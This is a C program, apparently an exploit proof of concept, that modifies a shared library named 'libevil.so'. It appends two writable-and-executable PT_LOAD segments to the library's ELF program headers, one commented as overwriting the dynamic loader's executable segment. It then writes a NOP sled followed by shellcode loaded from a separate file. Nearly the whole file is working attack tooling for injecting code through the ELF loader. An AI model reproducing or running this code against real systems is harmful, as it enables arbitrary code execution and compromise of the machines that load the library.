#include <elf.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

off_t get_len(int fd)
{
   off_t length = lseek(fd, 0, SEEK_END);

   lseek(fd, 0, SEEK_SET);
   return length;

}


int get_file(char *evilname)
{
   int fd = open(evilname, O_RDWR);
   if (fd < 0)
   {
       printf("Failed to open\n");
       return -1;
   }
   return fd;
}

int align(int fd, size_t len, size_t value)
{
	char buffer[4096] = {0};
	size_t rest = value - (len & (value - 1));
	while ( rest > 4096) {
		write(fd, buffer, 4096);
		rest -= 4096;
	}
	write(fd, buffer, rest);
	return 0;
}


int extend_elf(int fd, Elf64_Phdr *new_heades, unsigned int new_count, char* overlay, unsigned long overlay_len) {

   Elf64_Ehdr header = {0};

   int size = read(fd, &header, sizeof(header));
   if (size < sizeof(header))
   {
       printf("read failed\n");
       return -1;
   }
   if (header.e_ident[EI_CLASS] != ELFCLASS64)
   {
       printf("Not elf64\n");
       return -1;
   }

   if (header.e_phentsize != sizeof(Elf64_Phdr))
   {
       printf("unknown phdr struct\n");
       return -1;
   }
   unsigned long ph_size = header.e_phnum * header.e_phentsize;

   header.e_phnum += new_count;

   off_t off = lseek(fd, 0, SEEK_SET);
   if (off == (off_t)-1)
   {
       printf("bad ph_off\n");
       return -1;
   }
   size = write(fd, &header, sizeof(header));
   if (size != sizeof(header))
   {
       printf("failed to write header\n");
       return -1;
   }


   off = lseek(fd, ph_size + header.e_phoff, SEEK_SET);
   if (off == (off_t)-1)
   {
       printf("bad ph_off\n");
       return -1;
   }

   size = write(fd, new_heades, new_count*sizeof(Elf64_Phdr));
   if (size != new_count*sizeof(Elf64_Phdr))
   {
       printf("write failed, file corrupted. sorry\n");
       return -1;
   }
   off = lseek(fd, 0, SEEK_SET);
   if (off == (off_t)-1)
   {
	printf("failed go to start");
       return -1;
   }

   off = lseek(fd, 0, SEEK_END);
   if (off == (off_t)-1)
   {
       printf("failed to seek to end\n");
       return -1;
   }
   align(fd, off, new_heades[0].p_align);

   return 0;
}



char shellcode[4096];
unsigned long libc_size = 0x26000;
int main() {
   int scfd = get_file("shellcode.bin");
   off_t sc_len = get_len(scfd);
   read(scfd, shellcode, sc_len);

   int fd = get_file("libevil.so");
   if (fd < 0)
       printf("failed open\n");

   off_t off = get_len(fd);
   if (off == (off_t)-1)
   {
       printf("failed get len\n");
       close(fd);
       return -1;
   }

   Elf64_Phdr new_headers[2];

   new_headers[0].p_type = PT_LOAD; // segment with shellcode, will overwrite ld r-x segment
   new_headers[0].p_flags = PF_X|PF_R|PF_W;
   new_headers[0].p_offset = off + (4096 - (4095&off));
   new_headers[0].p_vaddr = 0x400000;
   new_headers[0].p_paddr = 0;
   new_headers[0].p_filesz = libc_size;
   new_headers[0].p_memsz = 0x200000;
   new_headers[0].p_align = 4096;

   if ( ((new_headers[0].p_vaddr - new_headers[0].p_offset)
                & (new_headers[0].p_align - 1)) != 0 )
   {

       printf("ELF load command address/offset not properly aligned\n");
       return -1;
   }

   new_headers[1].p_type = PT_LOAD;
   new_headers[1].p_flags = PF_X|PF_R|PF_W;
   new_headers[1].p_offset = 0;
   new_headers[1].p_vaddr = 0x200000;
   new_headers[1].p_paddr = 0;
   new_headers[1].p_filesz = 0;
   new_headers[1].p_memsz = 0x200000;
   new_headers[1].p_align = 0x200000;

   int res = extend_elf(fd, (Elf64_Phdr*)&new_headers, 2, shellcode, sc_len);
   char buffer[4096];
   memset(buffer, 0x90, 4096);
   unsigned long size = libc_size;
   while(size > 4096)
   {
	write(fd, buffer, 4096);
	size -= 4096;
   }
   memcpy(buffer + 4095 - sc_len, shellcode, sc_len);
   write(fd, buffer, 4096);

   close(fd);
   return res;
}
